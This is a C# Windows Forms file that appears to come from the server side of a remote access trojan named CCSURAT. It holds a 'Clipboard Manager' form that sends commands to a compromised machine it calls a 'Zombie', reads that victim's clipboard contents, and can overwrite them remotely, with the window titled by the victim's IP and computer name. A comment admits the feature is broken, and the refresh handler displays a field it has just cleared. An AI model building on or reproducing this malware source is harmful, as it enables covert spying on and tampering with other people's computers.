using CCSURAT_Server;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace CCSURAT_Server.ControlForms
{
    // ########### DOES NOT WORK, SOMETHING ON CLIENT'S SIDE, REWORK CLIENT SIDE CODE TO RETURN 
    //  CLIPBOARD PROPERLY. STAT thread?? ######################################################
    public partial class Clipboard : Form
    {
        Zombie zombie;

        public Clipboard(Zombie zombie)
        {
            InitializeComponent();
            this.zombie = zombie;
            this.Text = zombie.IP + " " + zombie.computerName + " Clipboard Manager";
        }

        private void Clipboard_Load(object sender, EventArgs e)
        {
            zombie.SendData("[[CLIPBOARD]][[/CLIPBOARD]]");
            while (zombie.clipboard == string.Empty)
            {
                System.Threading.Thread.Sleep(2);
                Application.DoEvents();
            }
            string data = zombie.clipboard;
            zombie.clipboard = string.Empty;
            if (data != "[[EMPTY]]")
                clipboardTextbox.Text = data;
            else
                clipboardTextbox.Text = string.Empty;
            
        }

        private void setToolStripMenuItem_Click(object sender, EventArgs e)
        {
            zombie.SendData("[[CLIPBOARD]]" + clipboardTextbox.Text + "[[/CLIPBOARD]]");
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            zombie.SendData("[[CLIPBOARD]][[/CLIPBOARD]]");
            while (zombie.clipboard == string.Empty)
            {
                System.Threading.Thread.Sleep(2);
                Application.DoEvents();
            }
            string data = zombie.clipboard;
            zombie.clipboard = string.Empty;
            if (data != "[[EMPTY]]")
                clipboardTextbox.Text = zombie.clipboard;
            else
                clipboardTextbox.Text = string.Empty;
        }
    }
}
